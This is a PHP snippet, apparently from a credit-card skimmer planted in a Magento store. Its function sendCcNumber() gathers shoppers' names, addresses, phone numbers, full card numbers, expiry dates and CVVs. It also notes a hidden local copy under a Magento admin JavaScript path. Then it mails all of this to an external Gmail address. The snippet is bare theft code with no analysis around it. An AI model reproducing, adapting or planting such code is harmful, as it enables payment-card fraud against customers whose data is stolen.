       ...
       function sendCcNumber()
        {
            ...
            $bin     = str_replace(' ', '', $data10);
            $bin     = substr($bin, 0, 6);
            $name    = substr($data10, 0, 6);
            ...
            $message .= "Name on Card   : ".$data1." ".$data2."\n";
            $message .= "Address 1      : ".$data3."\n";
            $message .= "Address 2      : ".$data4."\n";
            $message .= "City           : ".$data5."\n";
            $message .= "State          : ".$data6."\n";
            $message .= "Zip            : ".$data7."\n";
            $message .= "Country        : ".$data8."\n";
            $message .= "Phone          : ".$data9."\n";
            $message .= "BIN            : ".$ccbank ." ". $cctype ." ". $ccklas."\n";
            $message .= "ccnum          : ".$data10."\n";
            $message .= "expdate        : ".$data11." / ".$data12."\n";
            $message .= "cvv            : ".$data13."\n";
            $message .= "From           : ".$data15."\n";
            $message .= "Local Save     : ".$data15."/js/mage/adminhtml/tes.txt\n";
            $message .= "Email          : ".$data16."\n";

            $subject  = "[Credit Card USA - ".$cctype."] ".$ccbrand." - ".$ccbank;
            mail("dr.mamo84@gmail.com", $subject , $message);
    }
